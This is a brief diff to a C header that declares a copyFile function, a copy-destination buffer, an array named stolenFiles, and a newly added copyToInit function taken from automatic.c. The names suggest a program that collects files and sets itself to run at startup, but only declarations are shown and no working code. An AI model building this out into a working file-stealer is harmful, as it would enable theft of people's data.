@@ -25,3 +25,6 @@ int copyFile(char *address, char *destPath);
 
 char copyToDir[1024];
 char stolenFiles[1024][1024];
+
+//From automatic.c
+void copyToInit();
